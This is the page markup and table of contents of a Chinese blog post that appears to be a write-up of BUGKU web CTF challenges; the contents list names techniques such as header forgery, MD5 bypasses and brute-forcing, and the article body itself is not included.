<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
<script>
  (function () {
    var OriginTitle = document.title;
    var titleTime;
    document.addEventListener('visibilitychange', function () {
      if (document.hidden) {
        document.title = '坏人！看完了就想走' + OriginTitle;
        clearTimeout(titleTime);
      } else {
        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
        titleTime = setTimeout(function () {
          document.title = OriginTitle;
        }, 2000);
      }
    });
  })();
</script>

    <meta name="description" content="BUGKU--web">
<meta property="og:type" content="article">
<meta property="og:title" content="BUGKU--web">
<meta property="og:url" content="https://wanth3f1ag.top/2024/11/25/BUGKU-web/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="BUGKU--web">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153012282.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153042040.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153453676.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153647739.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153903194.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153951559.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125154219421.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125170523418.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125170808813.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125170840141.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125171030828.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125182502224.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20250428085701831.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125184238472.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20250428090145263.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20250428090722129.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125185209527.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125185739491.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125194129448.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125194924245.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125195024684.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125204332965.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125204429474.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125204805777.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125204914898.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125211016567.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125211206101.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/image-20241125211516817.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125211523239.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125211813962.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125212327225.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125212754900.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125213525551.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125213819622.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125214206865.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125214705440.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125232837903.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125233808776.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128160951844.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128161024755.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128161414514.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128161501709.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126104244668.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126104319404.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126104920035.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126105256625.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126105607312.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126105944232.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126105950391.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126110733003.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126110838510.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126110902896.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126112822178.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126114230980.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126114249269.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126114340881.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126114357915.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126114537404.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126140411099.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126141535282.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126143402053.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126145315853.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126145257655.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126145916680.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20250611175944476.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126153642287.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126155017757.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126160635726.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126161220352.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126162309858.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126163042405.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126163517748.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126164155012.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126164215358.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126164233124.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241126165219445.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241127122221343.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241127122335565.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128155958367.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/3e1c733f53829f722a89291b2a924c09.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128163337774.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128170957161.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128172752782.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128172945377.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128173135766.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128173236951.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128173310736.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128173332219.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128173757042.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128174432109.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128174723382.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128203028580.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/42d440b0ce7108e92c4ae70ac4370adb.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128203743086.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128204146405.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128204351461.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128204456485.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128212239416.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128213541200.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128222005854.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/f71dc38c4b754549934728d23ebe5af9.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128222432176.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128222507466.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128223135671.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128223616330.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128223646498.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128224310295.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128234822499.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241128235253516.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129210543147.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129211537290.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129212037211.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129212118126.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129212321382.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129213813099.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129151847256.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129173833646.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241129203825376.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241130004755731.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241130004929742.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241201222057191.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241202102642472.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241202102759797.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241202102910816.png">
<meta property="article:published_time" content="2024-11-25T07:24:08.000Z">
<meta property="article:modified_time" content="2025-12-01T11:22:28.617Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="BUGKU">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/BUGKU/image-20241125153012282.png">


<link rel="canonical" href="https://wanth3f1ag.top/2024/11/25/BUGKU-web/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2024/11/25/BUGKU-web/","path":"2024/11/25/BUGKU-web/","title":"BUGKU--web"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>BUGKU--web | root@wanth3f1ag</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>





  <script src="/js/third-party/pace.js" defer></script>


  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">root@wanth3f1ag</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">CTFer</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%91%E7%A8%BD"><span class="nav-number">1.</span> <span class="nav-text">滑稽</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#F12"><span class="nav-number">1.1.</span> <span class="nav-text">#F12</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">计算器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AFjs"><span class="nav-number">2.1.</span> <span class="nav-text">#前端js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alert"><span class="nav-number">3.</span> <span class="nav-text">alert</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81flag"><span class="nav-number">3.1.</span> <span class="nav-text">#源码flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B"><span class="nav-number">4.</span> <span class="nav-text">你必须让他停下</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%8F%E6%9C%BA%E6%8A%93%E5%8C%85%E6%9C%89flag"><span class="nav-number">4.1.</span> <span class="nav-text">#随机抓包有flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%B4%E7%AD%89%E8%88%B1"><span class="nav-number">5.</span> <span class="nav-text">头等舱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="nav-number">5.1.</span> <span class="nav-text">#响应头</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET"><span class="nav-number">6.</span> <span class="nav-text">GET</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E4%BC%A0%E5%8F%82"><span class="nav-number">6.1.</span> <span class="nav-text">#GET传参</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST"><span class="nav-number">7.</span> <span class="nav-text">POST</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E4%BC%A0%E5%8F%82"><span class="nav-number">7.1.</span> <span class="nav-text">#POST传参</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#source"><span class="nav-number">8.</span> <span class="nav-text">source</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#git%E6%B3%84%E9%9C%B2"><span class="nav-number">8.1.</span> <span class="nav-text">#.git泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%9B%E7%9B%BE"><span class="nav-number">9.</span> <span class="nav-text">矛盾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#is-numeric%E7%BB%95%E8%BF%87-%E5%BC%B1%E6%AF%94%E8%BE%83"><span class="nav-number">9.1.</span> <span class="nav-text">#is_numeric绕过+弱比较</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="nav-number">10.</span> <span class="nav-text">备份是个好习惯</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E7%BB%95%E8%BF%87"><span class="nav-number">10.1.</span> <span class="nav-text">#md5绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D"><span class="nav-number">10.1.1.</span> <span class="nav-text">常见的网站源码备份文件后缀名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">10.1.2.</span> <span class="nav-text">常见的网站源码备份文件名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E9%87%8F1"><span class="nav-number">11.</span> <span class="nav-text">变量1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B9%9D%E5%A4%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">11.1.</span> <span class="nav-text">九大全局变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">12.</span> <span class="nav-text">本地管理员</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="nav-number">12.1.</span> <span class="nav-text">#伪造请求头</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#game1"><span class="nav-number">13.</span> <span class="nav-text">game1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-number">13.1.</span> <span class="nav-text">#前端验证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">14.</span> <span class="nav-text">源代码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">14.1.</span> <span class="nav-text">#js代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="nav-number">15.</span> <span class="nav-text">网站被黑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%AC"><span class="nav-number">15.1.</span> <span class="nav-text">#后门木马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bp"><span class="nav-number">16.</span> <span class="nav-text">bp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">16.1.</span> <span class="nav-text">#爆破密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%BD%E5%83%8F%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81"><span class="nav-number">17.</span> <span class="nav-text">好像需要密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%AF%E6%95%B0%E5%AD%97%E7%88%86%E7%A0%B4"><span class="nav-number">17.1.</span> <span class="nav-text">#纯数字爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">18.</span> <span class="nav-text">shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#assert%E5%87%BD%E6%95%B0"><span class="nav-number">18.1.</span> <span class="nav-text">#assert函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">19.</span> <span class="nav-text">eval</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval%E5%87%BD%E6%95%B0"><span class="nav-number">19.1.</span> <span class="nav-text">#eval函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">20.</span> <span class="nav-text">需要管理员</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#robot%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="nav-number">20.1.</span> <span class="nav-text">#.robot文件泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="nav-number">21.</span> <span class="nav-text">程序员本地网站</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0X-Forwarded-For%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="nav-number">21.1.</span> <span class="nav-text">#伪造X-Forwarded-For请求头</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="nav-number">22.</span> <span class="nav-text">你从哪里来</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0Referer%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="nav-number">22.1.</span> <span class="nav-text">#伪造Referer请求头</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E5%A5%B3%E5%8F%8B"><span class="nav-number">23.</span> <span class="nav-text">前女友</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87md5%E5%92%8Cstrcmp-%E9%AA%8C%E8%AF%81"><span class="nav-number">23.1.</span> <span class="nav-text">#绕过md5和strcmp()验证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MD5"><span class="nav-number">24.</span> <span class="nav-text">MD5</span></a><ol 